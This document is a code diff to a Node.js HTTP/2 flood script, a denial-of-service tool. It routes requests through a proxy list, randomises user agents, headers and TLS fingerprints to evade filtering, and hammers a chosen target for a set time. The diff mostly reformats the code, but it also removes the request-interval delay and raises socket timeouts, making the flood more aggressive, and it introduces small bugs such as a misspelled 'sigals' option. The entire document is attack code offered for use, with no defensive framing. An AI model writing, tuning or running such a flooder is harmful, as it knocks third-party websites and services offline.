@@ -9,12 +9,14 @@ const UserAgent = require('user-agents');
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function () {});
+
 if (process.argv.length < 7) { 
     console.log(`Usage: target time rate thread proxyfile`); 
     process.exit(); 
 }
+
 function readLines(filePath) {
-    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
@@ -25,9 +27,12 @@ function randomElement(elements) {
 function randstr(length) {
     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
     let result = "";
-    for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
+    for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
     return result;
 }
+
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
@@ -35,6 +40,7 @@ const args = {
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 };
+
 const sig = [
     'ecdsa_secp256r1_sha256',
     'rsa_pkcs1_sha384',
@@ -106,6 +112,7 @@ const rateHeaders = [
     { "cluster-ip": randstr(12) },
     { "user-agent": randstr(12) }
 ];
+
 let proxies = readLines(args.proxyFile);
 function shuffleArray(array) {
     for (let i = array.length - 1; i > 0; i--) {
@@ -114,17 +121,21 @@ function shuffleArray(array) {
     }
 }
 shuffleArray(proxies);
+
 const parsedTarget = url.parse(args.target);
 if (cluster.isMaster) {
-    for (let counter = 1; counter <= args.threads; counter++) cluster.fork();
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
+    }
     console.clear();
-    console.log('\x1b[1m\x1b[34mTarget: \x1b[0m\x1b[1m' + parsedTarget.host + '\x1b[0m');
-    console.log('\x1b[1m\x1b[33mDuration: \x1b[0m\x1b[1m' + args.time + '\x1b[0m');
-    console.log('\x1b[1m\x1b[32mThreads: \x1b[0m\x1b[1m' + args.threads + '\x1b[0m');
-    console.log('\x1b[1m\x1b[31mRequests per second: \x1b[0m\x1b[1m' + args.Rate + '\x1b[0m');
+    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m' + parsedTarget.host + '\x1b[0m');
+    console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
+    console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
+    console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
 } else {
-    setInterval(runFlooder, randomIntn(150, 500));
+    setInterval(runFlooder);
 }
+
 class NetSocket {
     HTTP(options, callback) {
         const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
@@ -134,9 +145,11 @@ class NetSocket {
             port: options.port,
             noDelay: true
         });
-        connection.setTimeout(options.timeout * 1000);
+        connection.setTimeout(options.timeout * 100000);
         connection.setKeepAlive(true, 100000);
-        connection.on("connect", () => connection.write(buffer));
+        connection.on("connect", () => {
+            connection.write(buffer);
+        });
         connection.on("data", chunk => {
             const response = chunk.toString("utf-8");
             const isAlive = response.includes("HTTP/1.1 200");
@@ -156,13 +169,15 @@ class NetSocket {
         });
     }
 }
+
 const customUserAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
+  "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+  "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
+  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
 ];
+
 function generateUserAgent() {
     if (Math.random() < 0.5) {
         return new UserAgent({
@@ -173,7 +188,9 @@ function generateUserAgent() {
         return randomElement(customUserAgents);
     }
 }
+
 const Socker = new NetSocket();
+
 function generateHeaders() {
     return {
         ":method": randomElement(methods),
@@ -196,9 +213,9 @@ function generateHeaders() {
         "x-requested-with": "XMLHttpRequest"
     };
 }
+
 function runFlooder() {
-    if (proxies.length === 0) return;
-    const proxyAddr = proxies[randomIntn(0, proxies.length)];
+    const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const proxyOptions = {
         host: parsedProxy[0],
@@ -208,38 +225,40 @@ function runFlooder() {
     };
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
-            connection?.end();
+            connection?.close();
             connection?.destroy();
             return;
         }
         const tlsOptions = (() => {
-            if (Math.random() < 0.5) return {
-                secure: true,
-                ALPNProtocols: ['h2'],
-                sigalgs: randomElement(sig),
-                socket: connection,
-                ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                ecdhCurve: 'P-256:P-384',
-                host: parsedTarget.host,
-                servername: parsedTarget.host,
-                rejectUnauthorized: false
-            };
-            else return {
-                secure: true,
-                ALPNProtocols: ['h2'],
-                ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                ecdhCurve: 'auto',
-                rejectUnauthorized: false,
-                servername: parsedTarget.host,
-                secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
-                    crypto.constants.SSL_OP_NO_TICKET |
-                    crypto.constants.SSL_OP_NO_COMPRESSION |
-                    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
-                    crypto.constants.SSL_OP_NO_RENEGOTIATION |
-                    crypto.constants.SSL_OP_SINGLE_DH_USE |
-                    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
-                    crypto.constants.SSL_OP_NO_QUERY_MTU
-            };
+            const useTlsOption2 = (Math.random() < 0.5);
+            return useTlsOption2 ?
+                {
+                    secure: true,
+                    ALPNProtocols: ['h2'],
+                    sigals: randomElement(sig),
+                    socket: connection,
+                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+                    ecdhCurve: 'P-256:P-384',
+                    host: parsedTarget.host,
+                    servername: parsedTarget.host,
+                    rejectUnauthorized: false
+                } :
+                {
+                    secure: true,
+                    ALPNProtocols: ['h2'],
+                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+                    ecdhCurve: 'auto',
+                    rejectUnauthorized: false,
+                    servername: parsedTarget.host,
+                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
+                        crypto.constants.SSL_OP_NO_TICKET |
+                        crypto.constants.SSL_OP_NO_COMPRESSION |
+                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+                        crypto.constants.SSL_OP_NO_RENEGOTIATION |
+                        crypto.constants.SSL_OP_SINGLE_DH_USE |
+                        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+                        crypto.constants.SSL_OP_NO_QUERY_MTU
+                };
         })();
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
         tlsConn.setKeepAlive(true, 60000);
@@ -275,4 +294,5 @@ function runFlooder() {
         });
     });
 }
+
 setTimeout(() => process.exit(1), args.time * 1000);
